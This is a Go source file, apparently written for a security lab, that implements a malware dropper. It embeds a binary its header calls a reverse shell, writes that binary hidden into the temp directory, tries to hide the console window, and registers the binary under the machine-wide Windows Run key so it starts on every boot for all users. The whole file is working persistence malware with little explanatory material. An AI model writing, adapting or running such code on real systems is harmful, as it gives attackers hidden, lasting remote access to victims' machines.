/*
Author: Justin Shultz
ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
Lab: Write malware that adds a registry key to run an executable on start up as a background process

Description:
This Go program embeds a reverse shell binary file (`task.exe`), which is added to the Windows Run
registry key set to run the exe as a hidden background process on startup.
*/

package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// Embed the `task.exe` binary file
//
//go:embed task.exe
var taskExe []byte

// Adds `task.exe` to the Run registry key in LOCAL_MACHINE for persistence across all users
func addToStartup(taskPath string) error {
	// Open the LOCAL_MACHINE Run registry key
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE|registry.WRITE)
	if err != nil {
		return fmt.Errorf("failed to open LOCAL_MACHINE registry key: %v", err)
	}
	defer key.Close()

	// Set the registry value to run `task.exe`
	err = key.SetStringValue("BackgroundProcess", taskPath)
	if err != nil {
		return fmt.Errorf("failed to set registry value: %v", err)
	}
	return nil
}

// Hides the console window to make the malware invisible
func hideConsoleWindow() {
	cmd := exec.Command("cmd.exe", "/C", "start", "/B", "cmd.exe", "/C", "exit")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmd.Run()
}

// Sets file attributes to hidden for `task.exe`
func setFileHidden(filepath string) error {
	utf16Ptr, err := windows.UTF16PtrFromString(filepath)
	if err != nil {
		return fmt.Errorf("failed to convert file path to UTF16: %v", err)
	}

	err = windows.SetFileAttributes(utf16Ptr, windows.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		return fmt.Errorf("failed to set file attributes: %v", err)
	}

	return nil
}

// Extracts `task.exe` to a specified path
func extractTaskExe() (string, error) {
	// Define the path to extract `task.exe`
	taskPath := filepath.Join(os.TempDir(), "task.exe")

	// Write the embedded `task.exe` to the temp directory
	err := os.WriteFile(taskPath, taskExe, 0755)
	if err != nil {
		return "", fmt.Errorf("failed to write task.exe: %v", err)
	}

	// Set the file as hidden
	err = setFileHidden(taskPath)
	if err != nil {
		return "", fmt.Errorf("failed to hide task.exe: %v", err)
	}

	return taskPath, nil
}

func main() {
	// Hide the console window
	hideConsoleWindow()

	// Extract task.exe
	taskPath, err := extractTaskExe()
	if err != nil {
		fmt.Println("Error extracting task.exe:", err)
		return
	}

	// Add task.exe to startup registry key in LOCAL_MACHINE
	err = addToStartup(taskPath)
	if err != nil {
		fmt.Println("Error adding task.exe to startup:", err)
		return
	}
}
